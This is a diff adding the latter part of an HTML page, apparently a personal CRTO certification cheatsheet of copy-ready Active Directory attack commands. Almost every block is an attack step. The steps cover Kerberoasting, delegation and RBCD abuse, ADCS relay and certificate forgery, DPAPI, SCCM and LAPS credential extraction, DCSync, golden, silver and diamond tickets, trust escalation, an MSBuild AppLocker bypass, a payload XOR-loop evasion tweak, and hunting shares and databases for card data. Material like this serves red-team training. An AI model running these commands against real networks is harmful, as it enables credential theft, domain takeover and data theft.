+        <div class="code-body"><pre><span class="comment"># Reverse Port Forward</span>
+rportfwd &lt;BIND_PORT&gt; &lt;FORWARD_HOST&gt; &lt;FORWARD_PORT&gt;
+
+<span class="comment"># PortBender (redirect traffic)</span>
+PortBender redirect &lt;SOURCE_PORT&gt; &lt;DEST_PORT&gt;
+
+<span class="comment"># Firewall rule for port forward</span>
+netsh advfirewall firewall add rule name="&lt;RULE_NAME&gt;" dir=in action=allow protocol=TCP localport=&lt;PORT&gt;</pre></div>
+    </div>
+
+    <h3>Kerberos Through Proxy</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Linux</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>proxychains python3 /usr/local/bin/getTGT.py &lt;DOMAIN&gt;/&lt;USER&gt; -dc-ip &lt;DC_IP&gt;
+export KRB5CCNAME=/path/to/ticket.ccache</pre></div>
+    </div>
+</div>
+
+<!-- 12 KERBEROS ATTACKS -->
+<div class="section-block reveal" id="kerberos">
+    <div class="section-number">// 12</div>
+    <h2><span class="accent">Kerberos</span> Attacks</h2>
+
+    <h3>Kerberoasting &amp; AS-REP Roasting</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Kerberoasting</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe kerberoast /user:&lt;SERVICE_USER&gt; /nowrap
+
+<span class="comment"># AS-REP Roasting</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe asreproast /user:&lt;USER&gt; /nowrap</pre></div>
+    </div>
+
+    <h3>Unconstrained Delegation</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Unconstrained Delegation - Monitor for TGTs</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe monitor /interval:10 /nowrap</pre></div>
+    </div>
+
+    <h3>Constrained Delegation - S4U</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Constrained Delegation - S4U</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u /impersonateuser:&lt;TARGET_USER&gt; /msdsspn:cifs/&lt;TARGET&gt;.&lt;DOMAIN&gt; /user:&lt;SERVICE_USER&gt; /ticket:&lt;BASE64_TICKET&gt; /nowrap
+
+<span class="comment"># Alternative Service Name</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u /impersonateuser:&lt;TARGET_USER&gt; /msdsspn:cifs/&lt;TARGET&gt;.&lt;DOMAIN&gt; /altservice:ldap /user:&lt;SERVICE_USER&gt; /ticket:&lt;BASE64_TICKET&gt; /nowrap</pre></div>
+    </div>
+
+    <h3>Resource-Based Constrained Delegation (RBCD)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># RBCD - Set msDS-AllowedToActOnBehalfOfOtherIdentity</span>
+powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;MACHINE_SID&gt;)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "&lt;TARGET&gt;" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+
+<span class="comment"># RBCD - Perform S4U</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u /user:&lt;MACHINE&gt;$ /impersonateuser:&lt;TARGET_USER&gt; /msdsspn:cifs/&lt;TARGET&gt;.&lt;DOMAIN&gt; /ticket:&lt;BASE64_TICKET&gt; /nowrap</pre></div>
+    </div>
+</div>
+
+<!-- 13 AD CS (CERTIFICATE ABUSE) -->
+<div class="section-block reveal" id="adcs">
+    <div class="section-number">// 13</div>
+    <h2>AD CS - <span class="accent">Certificate Abuse</span></h2>
+
+    <h3>Enumerate Certificate Authorities</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Find Certificate Authorities</span>
+execute-assembly C:\Tools\Certify\Certify.exe cas
+
+<span class="comment"># Find vulnerable templates</span>
+execute-assembly C:\Tools\Certify\Certify.exe find /vulnerable</pre></div>
+    </div>
+
+    <h3>Request Certificate with Alternative Name</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>execute-assembly C:\Tools\Certify\Certify.exe request /ca:&lt;CA_NAME&gt; /template:&lt;TEMPLATE&gt; /altname:&lt;TARGET_USER&gt;</pre></div>
+    </div>
+
+    <h3>NTLM Relay to ADCS &amp; Printer Bug</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Linux / Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># NTLM Relay to ADCS HTTP endpoint</span>
+proxychains ntlmrelayx.py -t http://&lt;CA_SERVER&gt;/certsrv/certfnsh.asp -smb2support --adcs --template &lt;TEMPLATE&gt;
+
+<span class="comment"># Trigger printer bug</span>
+execute-assembly C:\Tools\SharpSpoolTrigger\SharpSpoolTrigger.exe &lt;TARGET&gt; &lt;LISTENER_HOST&gt;</pre></div>
+    </div>
+
+    <h3>Forge Certificates with Stolen CA Key</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>ForgeCert.exe --CaCertPath &lt;CA_CERT&gt; --CaCertPassword &lt;PASSWORD&gt; --Subject "CN=&lt;USER&gt;" --SubjectAltName "&lt;USER&gt;@&lt;DOMAIN&gt;" --NewCertPath &lt;OUTPUT&gt; --NewCertPassword &lt;PASSWORD&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 14 GPO ABUSE -->
+<div class="section-block reveal" id="gpoabuse">
+    <div class="section-number">// 14</div>
+    <h2>GPO <span class="accent">Abuse</span></h2>
+
+    <h3>Find Modifiable GPOs</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "&lt;SID&gt;" }</pre></div>
+    </div>
+
+    <h3>Find Affected OUs/Computers</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powerpick Get-DomainOU -GPLink "{&lt;GPO_ID&gt;}" | select distinguishedName
+powerpick (Get-DomainOU -GPLink "{&lt;GPO_ID&gt;}").distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name</pre></div>
+    </div>
+
+    <h3>SharpGPOAbuse &amp; GPO Linking</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike / PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SharpGPOAbuse - Add startup script</span>
+execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse.exe --AddComputerScript --ScriptName "&lt;SCRIPT&gt;" --ScriptContents "&lt;COMMAND&gt;" --GPOName "&lt;GPO_NAME&gt;"
+
+<span class="comment"># Create and Link new GPO</span>
+New-GPO -Name "&lt;GPO_NAME&gt;" | New-GPLink -Target "&lt;OU_DN&gt;"</pre></div>
+    </div>
+</div>
+
+<!-- 15 DPAPI -->
+<div class="section-block reveal" id="dpapi">
+    <div class="section-number">// 15</div>
+    <h2><span class="accent">DPAPI</span></h2>
+
+    <h3>Find Credential Files</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>ls C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials\
+ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\</pre></div>
+    </div>
+
+    <h3>Mimikatz DPAPI</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>mimikatz dpapi::cred /in:C:\path\to\credential_file</pre></div>
+    </div>
+
+    <h3>Credential Manager &amp; SharpDPAPI</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Credential Manager vaults</span>
+vaultcmd /listcreds:"Windows Credentials" /all
+execute-assembly C:\Tools\Seatbelt\Seatbelt.exe WindowsVault
+
+<span class="comment"># SharpDPAPI</span>
+execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI.exe credentials /rpc</pre></div>
+    </div>
+</div>
+
+<!-- 16 MSSQL SERVERS -->
+<div class="section-block reveal" id="mssql">
+    <div class="section-number">// 16</div>
+    <h2><span class="accent">MSSQL</span> Servers</h2>
+
+    <h3>Enumerate SQL Instances</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo</pre></div>
+    </div>
+
+    <h3>SQL Impersonation &amp; Command Execution</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SQL Impersonation</span>
+<span class="comment"># EXECUTE AS LOGIN = 'sa'</span>
+execute-assembly C:\Tools\SQLRecon\SQLRecon.exe /instance:&lt;SQL_SERVER&gt; /command:impersonate
+
+<span class="comment"># Enable xp_cmdshell</span>
+execute-assembly C:\Tools\SQLRecon\SQLRecon.exe /instance:&lt;SQL_SERVER&gt; /command:enablexp
+
+<span class="comment"># Execute OS commands</span>
+execute-assembly C:\Tools\SQLRecon\SQLRecon.exe /instance:&lt;SQL_SERVER&gt; /command:xp /argument:"whoami"</pre></div>
+    </div>
+
+    <h3>Linked Server Abuse</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">SQL</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SQL Linked Server enumeration</span>
+SELECT srvname, isremote FROM master..sysservers
+
+<span class="comment"># Query through linked server</span>
+SELECT * FROM OPENQUERY("&lt;LINKED_SERVER&gt;", 'SELECT * FROM information_schema.tables')
+
+<span class="comment"># Enable xp_cmdshell on linked server</span>
+EXEC('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [&lt;LINKED_SERVER&gt;]
+EXEC('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [&lt;LINKED_SERVER&gt;]</pre></div>
+    </div>
+
+    <h3>SweetPotato Privilege Escalation</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SweetPotato privilege escalation (SeImpersonatePrivilege)</span>
+execute-assembly C:\Tools\SweetPotato\SweetPotato.exe -p C:\Windows\Tasks\beacon.exe</pre></div>
+    </div>
+</div>
+
+<!-- 17 SCCM -->
+<div class="section-block reveal" id="sccm">
+    <div class="section-number">// 17</div>
+    <h2><span class="accent">SCCM</span></h2>
+
+    <h3>SCCM Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>execute-assembly C:\Tools\SharpSCCM\SharpSCCM.exe local site-info
+execute-assembly C:\Tools\SharpSCCM\SharpSCCM.exe get collections
+execute-assembly C:\Tools\SharpSCCM\SharpSCCM.exe get collection-members -n "&lt;COLLECTION&gt;"
+execute-assembly C:\Tools\SharpSCCM\SharpSCCM.exe get devices -n "&lt;DEVICE&gt;"</pre></div>
+    </div>
+
+    <h3>Extract Network Access Account Credentials</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>execute-assembly C:\Tools\SharpSCCM\SharpSCCM.exe local naa</pre></div>
+    </div>
+</div>
+
+<!-- 18 DOMAIN DOMINANCE -->
+<div class="section-block reveal" id="domaindominance">
+    <div class="section-number">// 18</div>
+    <h2>Domain <span class="accent">Dominance</span></h2>
+
+    <h3>DCSync</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>dcsync &lt;DOMAIN&gt; &lt;DOMAIN&gt;\krbtgt
+mimikatz @lsadump::dcsync /domain:&lt;DOMAIN&gt; /user:&lt;DOMAIN&gt;\krbtgt</pre></div>
+    </div>
+
+    <h3>Golden Ticket</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Golden Ticket</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe golden /aes256:&lt;AES256_HASH&gt; /user:&lt;USER&gt; /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /nowrap
+
+<span class="comment"># Import Golden Ticket</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:&lt;DOMAIN&gt; /username:&lt;USER&gt; /password:FakePass /ticket:&lt;BASE64_TICKET&gt;
+steal_token &lt;PID&gt;</pre></div>
+    </div>
+
+    <h3>Silver Ticket</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>execute-assembly C:\Tools\Rubeus\Rubeus.exe silver /service:cifs/&lt;TARGET&gt;.&lt;DOMAIN&gt; /aes256:&lt;AES256_HASH&gt; /user:&lt;USER&gt; /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /nowrap</pre></div>
+    </div>
+
+    <h3>Diamond Ticket</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>execute-assembly C:\Tools\Rubeus\Rubeus.exe diamond /tgtdeleg /ticketuser:&lt;USER&gt; /ticketuserid:&lt;RID&gt; /groups:512 /krbkey:&lt;AES256_HASH&gt; /nowrap</pre></div>
+    </div>
+
+    <h3>Forge Certificate &amp; DPAPI Backup Key</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD / Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Forge Certificate</span>
+ForgeCert.exe --CaCertPath &lt;CA_CERT&gt; --CaCertPassword &lt;PASSWORD&gt; --Subject "CN=&lt;USER&gt;" --SubjectAltName "&lt;USER&gt;@&lt;DOMAIN&gt;" --NewCertPath &lt;OUTPUT&gt; --NewCertPassword &lt;PASSWORD&gt;
+
+<span class="comment"># DPAPI Domain Backup Key</span>
+mimikatz !lsadump::backupkeys /system:&lt;DC&gt;.&lt;DOMAIN&gt; /export</pre></div>
+    </div>
+</div>
+
+<!-- 19 FOREST & DOMAIN TRUSTS -->
+<div class="section-block reveal" id="trusts">
+    <div class="section-number">// 19</div>
+    <h2>Forest &amp; Domain <span class="accent">Trusts</span></h2>
+
+    <h3>Enumerate Trusts</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powerpick Get-DomainTrust
+execute-assembly C:\Tools\ADSearch\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain &lt;DOMAIN&gt; --attributes distinguishedName,name,flatName,trustDirection</pre></div>
+    </div>
+
+    <h3>Parent-Child Trust Escalation (SID History)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Get child krbtgt hash via DCSync</span>
+dcsync &lt;CHILD_DOMAIN&gt; &lt;CHILD_DOMAIN&gt;\krbtgt
+
+<span class="comment"># Get Enterprise Admins SID</span>
+powerpick Get-DomainGroup -Identity "Enterprise Admins" -Domain &lt;PARENT_DOMAIN&gt; -Properties ObjectSid
+
+<span class="comment"># Forge golden ticket with SID History</span>
+execute-assembly C:\Tools\Rubeus\Rubeus.exe golden /aes256:&lt;AES256_HASH&gt; /user:&lt;USER&gt; /domain:&lt;CHILD_DOMAIN&gt; /sid:&lt;CHILD_SID&gt; /sids:&lt;ENTERPRISE_ADMINS_SID&gt; /nowrap</pre></div>
+    </div>
+
+    <h3>Inbound One-Way Trust</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powerpick Get-DomainForeignGroupMember -Domain &lt;EXTERNAL_DOMAIN&gt;
+powerpick ConvertFrom-SID &lt;SID&gt;
+execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:&lt;USER&gt; /domain:&lt;DOMAIN&gt; /aes256:&lt;AES256_HASH&gt; /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgs /service:krbtgt/&lt;EXTERNAL_DOMAIN&gt; /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt;.&lt;DOMAIN&gt; /ticket:&lt;BASE64_TICKET&gt; /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgs /service:cifs/&lt;TARGET&gt;.&lt;EXTERNAL_DOMAIN&gt; /domain:&lt;EXTERNAL_DOMAIN&gt; /dc:&lt;DC&gt;.&lt;EXTERNAL_DOMAIN&gt; /ticket:&lt;BASE64_TICKET&gt; /nowrap</pre></div>
+    </div>
+
+    <h3>Outbound One-Way Trust (TDO)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powerpick Get-DomainObject -Identity "CN=&lt;TRUST_NAME&gt;,CN=System,DC=&lt;DOMAIN_DC&gt;" | select objectGuid
+mimikatz @lsadump::dcsync /domain:&lt;DOMAIN&gt; /guid:{&lt;GUID&gt;}
+execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:&lt;TRUST_ACCOUNT&gt;$ /domain:&lt;EXTERNAL_DOMAIN&gt; /rc4:&lt;NTLM_HASH&gt; /nowrap</pre></div>
+    </div>
+</div>
+
+<!-- 20 LAPS -->
+<div class="section-block reveal" id="laps">
+    <div class="section-number">// 20</div>
+    <h2><span class="accent">LAPS</span></h2>
+
+    <h3>Identify LAPS GPOs</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powerpick Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath</pre></div>
+    </div>
+
+    <h3>Find LAPS-Enabled Computers</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powerpick Get-DomainComputer -SearchBase "&lt;OU_DN&gt;" -Properties cn</pre></div>
+    </div>
+
+    <h3>Read LAPS Password &amp; Expiration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Read LAPS password</span>
+powerpick Get-DomainComputer -Identity &lt;COMPUTER&gt; -Properties ms-Mcs-AdmPwd
+
+<span class="comment"># Check password expiration</span>
+powerpick Get-DomainComputer -Identity &lt;COMPUTER&gt; -Properties ms-Mcs-AdmPwdExpirationTime</pre></div>
+    </div>
+</div>
+
+<!-- 21 DEFENCE EVASION & APPLOCKER -->
+<div class="section-block reveal" id="evasion">
+    <div class="section-number">// 21</div>
+    <h2>Defence Evasion &amp; <span class="accent">AppLocker</span></h2>
+
+    <h3>Bypass ConstrainedLanguage Mode</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powershell $ExecutionContext.SessionState.LanguageMode
+<span class="comment"># If ConstrainedLanguage, use:</span>
+powerpick $ExecutionContext.SessionState.LanguageMode
+<span class="comment"># Returns: FullLanguage</span></pre></div>
+    </div>
+
+    <h3>Enumerate AppLocker &amp; Writable Directories</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Enumerate AppLocker policies</span>
+powershell Get-ChildItem "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
+
+<span class="comment"># Find writable directories</span>
+powershell Get-Acl C:\Windows\Tasks | fl</pre></div>
+    </div>
+
+    <h3>MSBuild AppLocker Bypass</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\payload.csproj</pre></div>
+    </div>
+
+    <h3>Artifact Kit &amp; Resource Kit Evasion</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">C / Concept</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Artifact Kit - Modify XOR loop</span>
+<span class="comment"># Change for loop to while loop for evasion</span>
+x = length;
+while(x--) {
+  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
+}
+
+<span class="comment"># Resource Kit - Modify template</span>
+<span class="comment"># Rename functions and obfuscate PowerShell template</span>
+<span class="comment"># Change XOR key value in decode loop</span>
+
+<span class="comment"># AMSI Bypass - Obfuscate PowerShell</span>
+<span class="comment"># Modify variable names and function names in templates</span></pre></div>
+    </div>
+</div>
+
+<!-- 22 DATA HUNTING & EXFILTRATION -->
+<div class="section-block reveal" id="datahunting">
+    <div class="section-number">// 22</div>
+    <h2>Data Hunting &amp; <span class="accent">Exfiltration</span></h2>
+
+    <h3>Find Accessible Shares</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powerpick Find-DomainShare -CheckShareAccess</pre></div>
+    </div>
+
+    <h3>Find Interesting Files</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*</pre></div>
+    </div>
+
+    <h3>SQL Data Extraction</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Cobalt Strike</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Query SQL databases through linked servers</span>
+powerpick Get-SQLQuery -Instance "&lt;SQL_SERVER&gt;,1433" -Query "select * from openquery(""&lt;LINKED_SERVER&gt;"", 'select * from information_schema.tables')"
+
+<span class="comment"># Extract data from SQL</span>
+powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize</pre></div>
+    </div>
+</div>
+
+</main>
+</div>
+
+<!-- Back to top -->
+<a href="#" class="back-top" id="backTop">&uarr;</a>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-inner">
+        <a href="/" class="footer-brand">GUARINA0x0</a>
+        <span class="footer-sep">&bull;</span>
+        <span>CRTO Cheatsheet</span>
+        <span class="footer-sep">&bull;</span>
+        <span>&copy; 2026</span>
+        <span class="footer-sep">&bull;</span>
+        <div class="footer-social">
+            <a href="https://github.com/Guarina0x0" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+            </a>
+            <a href="https://www.linkedin.com/in/antonio-gallego-l%C3%B3pez-14047b1bb/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+            </a>
+            <a href="https://x.com/Guarina0x0" target="_blank" rel="noopener noreferrer" aria-label="X (Twitter)">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+            </a>
+        </div>
+    </div>
+    <p class="footer-dimension">Transmitiendo desde la Dimensi&oacute;n C-137</p>
+</footer>
+
+<!-- Search Modal -->
+<div class="search-overlay" id="searchOverlay">
+    <div class="search-modal">
+        <div class="search-input-wrap">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+            <input type="text" class="search-input" id="searchInput" placeholder="Search commands..." autocomplete="off" spellcheck="false" aria-label="Buscar comandos">
+            <span class="search-result-count" id="searchCount"></span>
+            <span class="search-close-hint">ESC</span>
+        </div>
+        <div class="search-filters" id="searchFilters">
+            <div class="filter-row">
+                <button class="filter-chip active" data-sheet="all">All</button>
+                <button class="filter-chip" data-sheet="CRTE">CRTE</button>
+                <button class="filter-chip" data-sheet="CRTO">CRTO</button>
+                <button class="filter-chip" data-sheet="CWP">CWP</button>
+                <button class="filter-chip" data-sheet="CARTP">CARTP</button>
+            </div>
+            <div class="filter-row">
+                <button class="filter-chip lang active" data-lang="all">All Langs</button>
+                <button class="filter-chip lang" data-lang="PowerShell">PowerShell</button>
+                <button class="filter-chip lang" data-lang="Bash">Bash</button>
+                <button class="filter-chip lang" data-lang="CMD">CMD</button>
+                <button class="filter-chip lang" data-lang="Cobalt Strike">Cobalt Strike</button>
+            </div>
+        </div>
+        <div class="search-results" id="searchResults">
+            <div class="search-empty">Type to search commands across all cheatsheets...</div>
+        </div>
+        <div class="search-footer">
+            <span><kbd>&uarr;&darr;</kbd> Navigate</span>
+            <span><kbd>&crarr;</kbd> Open</span>
+            <span><kbd>esc</kbd> Close</span>
+        </div>
+    </div>
+</div>
+
+<script src="search-index.js"></script>
+<script src="main.js"></script>
+
+</body>
+</html>
